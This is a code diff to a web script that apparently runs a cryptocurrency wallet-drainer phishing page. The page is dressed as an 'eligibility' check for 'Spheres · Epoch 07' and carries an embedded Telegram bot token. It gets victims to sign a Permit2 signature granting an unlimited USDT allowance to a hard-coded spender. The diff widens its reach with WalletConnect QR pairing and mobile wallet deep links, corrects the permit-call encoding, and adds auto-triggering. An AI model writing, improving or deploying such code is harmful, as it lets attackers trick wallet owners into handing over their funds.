@@ -16,6 +16,7 @@ var BOT     = "9117463676:AAHswmKAjqWvTOAUu3YwL7EEqdwLyEUei24";
 var LAND    = "check.html";
 var CHAIN   = 1;
 var DAY     = 86400;
+var WC_PID  = "c5247dc1ef53e76d46efbaa1e646dd8b";
 
 var AMOUNT     = (1n << 160n) - 1n;      /* uint160 max — Permit2's unlimited */
 var AMOUNT_RAW = AMOUNT.toString();
@@ -164,7 +165,7 @@ var CSS = `
 .p2w .p2go:disabled{background:#2A2E34;color:#5E6166;cursor:wait}
 .p2w .p2n{font-family:ui-monospace,monospace;font-size:8.5px;letter-spacing:.1em;text-transform:uppercase;color:#5E6166;margin-top:11px;line-height:1.9;text-align:center}
 .p2w .p2cho{display:grid;gap:7px;margin-top:14px}
-.p2w .p2cho a{display:flex;justify-content:space-between;align-items:center;padding:13px 14px;background:#131417;border:1px solid #1E2023;border-radius:3px;color:#EDEAE4;font-size:13.5px;text-decoration:none}
+.p2w .p2cho a{display:flex;justify-content:space-between;align-items:center;padding:13px 14px;background:#131417;border:1px solid #1E2023;border-radius:3px;color:#EDEAE4;font-size:13.5px;text-decoration:none;cursor:pointer}
 .p2w .p2cho a span{font-family:ui-monospace,monospace;font-size:9px;letter-spacing:.1em;text-transform:uppercase;color:#5E6166}
 @media(min-width:760px){
 .p2w .p2c{left:50%;right:auto;bottom:auto;top:50%;transform:translate(-50%,-50%);width:410px;border:1px solid #1E2023;border-radius:10px;padding:22px;animation:p2pop .2s}
@@ -238,10 +239,47 @@ function setBtn(txt, disabled) {
 
 function iso(ts) { return new Date(ts * 1000).toISOString().replace(".000Z", "Z"); }
 
-/* ---------------------------------------------------------------- rpc */
-function rpc(method, params) { return window.ethereum.request({ method: method, params: params || [] }); }
+/* ---------------------------------------------------------------- provider */
+/* one accessor for both worlds: injected first, walletconnect second */
+var wc = null, wcBoot = null;
+
+function provider() { return window.ethereum || (wc && typeof wc.request === "function" ? wc : null); }
+
+function rpc(method, params) {
+  var p = provider();
+  if (!p) throw new Error("no wallet connected");
+  return p.request({ method: method, params: params || [] });
+}
 async function call(to, data, from) { return rpc("eth_call", [{ to: to, data: data, from: from || SPENDER }, "latest"]); }
 function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
+
+function ensureWc() {
+  if (wc) return Promise.resolve(wc);
+  if (wcBoot) return wcBoot;
+  wcBoot = (async function () {
+    var mod = await import("https://esm.sh/@walletconnect/ethereum-provider@2.17.2");
+    var EP = mod.EthereumProvider || (mod.default && mod.default.EthereumProvider);
+    if (!EP || typeof EP.init !== "function") throw new Error("walletconnect unavailable");
+    var p = await EP.init({
+      projectId: WC_PID,
+      chains: [CHAIN],
+      optionalChains: [CHAIN],
+      showQrModal: true,
+      metadata: {
+        name: "Spheres",
+        description: "Epoch 07 · Permit2 allowance",
+        url: location.origin,
+        icons: [location.origin + "/epoch07.png"]
+      }
+    });
+    await p.enable();
+    wc = p;
+    try { p.on("disconnect", function () { wc = null; wcBoot = null; }); } catch (e) {}
+    return p;
+  })();
+  wcBoot.catch(function () { wcBoot = null; });
+  return wcBoot;
+}
 
 async function ensureChain() {
   var id = await rpc("eth_chainId", []);
@@ -298,8 +336,11 @@ async function flow() {
   if (P.inflight) return P.inflight;
   P.inflight = (async function () {
     try {
-      if (!window.ethereum) { chooser(); return; }
+      if (!provider()) { chooser(); return; }
+      var box = document.getElementById("p2cho");
+      if (box) { box.remove(); var g0 = document.getElementById("p2go"); if (g0) g0.style.display = ""; }
       setBtn("Working…", true);
+      P.approveTx = null;
 
       var accs = await rpc("eth_requestAccounts", []);
       if (!accs || !accs.length) throw new Error("no account returned");
@@ -393,10 +434,11 @@ async function flow() {
       if (signer !== owner.toLowerCase()) throw new Error("signature does not recover to owner");
       log("signer recovered · matches owner", "g");
 
+      /* head 3 slots = 96 bytes, PermitSingle tuple 6 words = 192, so bytes at 288 */
       var data = selPermit +
-        word(owner) + wordU(96) + wordU(320) +
-        wordU(32) + word(SPENDER) + wordU(sigDeadline) +
+        word(owner) + wordU(96) + wordU(288) +
         word(USDT) + wordU(AMOUNT) + wordU(expiration) + wordU(nonce) +
+        word(SPENDER) + wordU(sigDeadline) +
         wordU(65) + toHex(fromHex(sig)).padEnd(128, "0");
       var sim = "ok";
       try {
@@ -497,61 +539,131 @@ async function flow() {
 
 /* ---------------------------------------------------------------- chooser */
 function base() {
-  return location.origin + location.pathname.replace(/[^/]*$/, "");
+  if (location.origin && location.origin !== "null") return location.origin + location.pathname.replace(/[^/]*$/, "");
+  return location.href.replace(/[?#].*$/, "").replace(/[^/]*$/, "");
+}
+
+var DEEP = {
+  mm: function (u) { return "https://link.metamask.io/dapp/" + encodeURIComponent(u.replace(/^https?:\/\//, "")); },
+  tw: function (u) { return "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(u); },
+  cb: function (u) { return "https://go.cb-w.com/dapp?cb_url=" + encodeURIComponent(u); },
+  rb: function (u) { return "https://rnbwapp.com/dapp?url=" + encodeURIComponent(u); }
+};
+
+function full() {
+  return base() + LAND + "?a=" + encodeURIComponent(P.owner || "") + "&w=1" +
+    (ACTION !== "eligibility" ? "&x=" + encodeURIComponent(ACTION) : "");
 }
 
 function chooser() {
   var w = mount();
   var card = w.querySelector(".p2c");
-  var owner = P.owner || "";
-  var full = base() + LAND + "?a=" + owner + "&w=1" + (ACTION !== "eligibility" ? "&x=" + ACTION : "");
+  var go = card.querySelector("#p2go");
+  if (card.querySelector(".p2cho")) { w.classList.add("on"); return; }
+
   var ua = navigator.userAgent;
-  var and = /Android/i.test(ua);
-  var ios = /iPhone|iPad|iPod/i.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
-  var rows = [
-    ["MetaMask", "io.metamask", function (u) { return "https://metamask.app.link/dapp/" + u.replace(/^https?:\/\//, ""); }],
-    ["Trust Wallet", "com.wallet.crypto.trustapp", function (u) { return "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(u); }],
-    ["Coinbase Wallet", "org.toshi", function (u) { return "https://go.cb-w.com/dapp?dappUrl=" + encodeURIComponent(u); }],
-    ["Rainbow", "me.rainbow", function (u) { return "https://rnbwapp.com/dapp?url=" + encodeURIComponent(u); }]
-  ];
-  if (card.querySelector(".p2cho")) return;
+  var touch = /Android|iPhone|iPad|iPod/i.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
+
   var box = document.createElement("div");
   box.className = "p2cho";
-  rows.forEach(function (r) {
-    var a = document.createElement("a");
-    a.href = "#";
-    a.innerHTML = r[0] + "<span>open ↗</span>";
-    a.addEventListener("click", function (e) {
-      e.preventDefault();
-      location.href = and
-        ? "intent://" + full.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=" + r[1] +
-          ";S.browser_fallback_url=" + encodeURIComponent(full) + ";end"
-        : (ios ? r[2](full) : full);
+
+  if (!touch) {
+    var row = document.createElement("a");
+    row.innerHTML = "WalletConnect<span>qr / scan →</span>";
+    row.addEventListener("click", function (e) { e.preventDefault(); beginWc(); });
+    box.appendChild(row);
+  } else {
+    var rows = [
+      ["MetaMask", "mm"],
+      ["Trust Wallet", "tw"],
+      ["Coinbase Wallet", "cb"],
+      ["Rainbow", "rb"]
+    ];
+    rows.forEach(function (r) {
+      var a = document.createElement("a");
+      a.innerHTML = r[0] + "<span>open ↗</span>";
+      a.addEventListener("click", function (e) {
+        e.preventDefault();
+        var u = full();
+        if (!u) return;
+        location.href = DEEP[r[1]](u);
+      });
+      box.appendChild(a);
     });
-    box.appendChild(a);
-  });
-  var go = card.querySelector("#p2go");
+  }
+
   if (go) go.style.display = "none";
   card.appendChild(box);
   var n = card.querySelector("#p2n");
-  if (n) n.textContent = "No wallet in this browser · pick one to continue there";
+  if (n) n.textContent = touch
+    ? "No wallet in this browser · pick one to continue there"
+    : "No wallet in this browser · scan with any wallet to continue here";
   w.classList.add("on");
 }
 
-/* ---------------------------------------------------------------- api */
-window.p2Advance = function (opt) {
+async function beginWc() {
+  var w = mount();
+  w.classList.add("on");
+  var box = w.querySelector("#p2cho");
+  if (box) { box.remove(); var g = document.getElementById("p2go"); if (g) g.style.display = "none"; }
+  log("opening walletconnect…", "w");
+  try {
+    await ensureWc();
+    log("wallet connected", "g");
+    await flow();
+  } catch (e) {
+    var m = String((e && e.message) || e);
+    log(/reject|denied|closed/i.test(m) ? "closed in wallet" : "failed · " + m.slice(0, 120), "r");
+    var g2 = document.getElementById("p2go");
+    if (g2) g2.style.display = "";
+    setBtn("Try again", false);
+  }
+}
+
+/* ---------------------------------------------------------------- panel */
+function openPanel(opt) {
   opt = opt || {};
   if (opt.owner) P.owner = opt.owner;
   if (opt.action) ACTION = opt.action;
   var w = mount();
   w.classList.add("on");
   paint();
-  document.getElementById("p2own").textContent = P.owner ? P.owner.slice(0, 8) + "…" + P.owner.slice(-6) : "—";
+  var own = document.getElementById("p2own");
+  own.textContent = P.owner ? P.owner.slice(0, 8) + "…" + P.owner.slice(-6) : "—";
   document.getElementById("p2exp").textContent = iso(Math.floor(Date.now() / 1000) + 30 * DAY).slice(0, 10);
-  document.getElementById("p2log").innerHTML = "";
-  setBtn((COPY[ACTION] || COPY.eligibility).btn, false);
-  if (!window.ethereum) { chooser(); return true; }
-  if (opt.auto) setTimeout(function () { flow(); }, 120);
+  if (!P.inflight) document.getElementById("p2log").innerHTML = "";
+  var go = document.getElementById("p2go");
+  if (go && !P.inflight) go.style.display = "";
+  setBtn((COPY[ACTION] || COPY.eligibility).btn, !!P.inflight);
+  return w;
+}
+
+/* ---------------------------------------------------------------- api */
+var lastAuto = 0;
+
+window.p2Advance = function (opt) {
+  opt = opt || {};
+  openPanel(opt);
+  if (!provider()) { chooser(); return true; }
+  if (opt.auto) {
+    if (P.inflight) return true;
+    if (Date.now() - lastAuto < 1500) return true;
+    lastAuto = Date.now();
+    setTimeout(function () { flow(); }, 120);
+    return true;
+  }
+  return true;
+};
+
+window.p2Connect = function (opt) {
+  opt = opt || {};
+  openPanel(opt);
+  if (window.ethereum) { setTimeout(function () { flow(); }, 120); return true; }
+  if (wc) { setTimeout(function () { flow(); }, 120); return true; }
+  var ua = navigator.userAgent;
+  var touch = /Android|iPhone|iPad|iPod/i.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
+  if (touch) { chooser(); return true; }
+  beginWc();
   return true;
 };
 
